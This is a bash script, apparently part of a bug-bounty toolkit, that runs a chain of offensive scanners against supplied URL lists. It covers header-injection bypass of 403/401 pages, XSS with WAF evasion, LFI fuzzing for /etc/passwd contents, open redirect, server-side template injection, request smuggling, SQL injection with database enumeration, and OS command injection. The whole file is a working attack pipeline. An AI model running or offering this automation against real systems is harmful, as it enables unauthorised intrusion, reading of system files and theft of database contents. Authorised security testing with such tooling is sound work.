#!/bin/bash


required_files=("httpx.txt" "XSS.txt" "LFI.txt" "Smuggler.txt" "SSRF.txt" "SSTI.txt" "SQL.txt" "OS_Commands.txt" "IPs.txt")



# Check httpx.txt file
if [ -f "httpx.txt" ]; then
    # head injection for 403&401
    cat httpx.txt | grep "403" | cut -d " " -f1 | anew 403.txt
    cat httpx.txt | grep "401" | cut -d " " -f1 | anew 403.txt
    cat 403.txt | while read url; do headi -u $url -p IPs.txt | anew output/403_Response.txt ; done
    sleep 5
fi

# Check XSS.txt file
if [ -f "XSS.txt" ]; then
    # XSS injection
    dalfox file XSS.txt --waf-evasion --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Firefox/115.0' -o output/XSS_Inject_Response.txt;
    sleep 5
fi

# Check LFI.txt file
if [ -f "LFI.txt" ]; then
    # LFI injection
    cat LFI.txt | qsreplace FUZZ | while read url; do
        ffuf -u $url -t 25 -mr "root:x" -w LFI_fuzz.txt -o output/LFI_Inject_Response.txt;
    done
    sleep 5
fi

# Check SSRF.txt file
if [ -f "SSRF.txt" ]; then
    # Open Redirect
    cd Oralyzer
    python3 oralyzer.py -l ../SSRF.txt | anew ../output/Open_Redirect_Response.txt
    cd ../
    sleep 5
fi

# Check SSTI.txt file
if [ -f "SSTI.txt" ]; then
    # SSTI injection
    cd tplmap
    cat ../SSTI.txt | while read url; do python3 tplmap.py -u $url | anew ../output/SSTI_Inject_Response.txt; done
    cd ../
    sleep 5
fi

# Check Smuggler.txt file
if [ -f "Smuggler.txt" ]; then
    # Smuggler injection
    cd smuggler
    cat ../Smuggler.txt | python3 smuggler.py | anew output/Smuggler_Response.txt
    cd ../
    sleep 5
fi

# Check SQL.txt file
if [ -f "SQL.txt" ]; then
    # SQL injection
    sqlmap -m SQL.txt --level 3 --risk 1 --batch --dbs --random-agent --tamper=between | anew output/SQL_Inject_Response.txt;
    sleep 5
fi

# Check OS_Commands.txt file 
if [ -f "OS_Commands.txt" ]; then
    # OS command injection
    cd commix
    cat ../OS_Commands.txt | while read url; do python3 commix.py -u $url --hostname | anew ../output/Command_Inject_Response.txt; done
    cd ../
fi

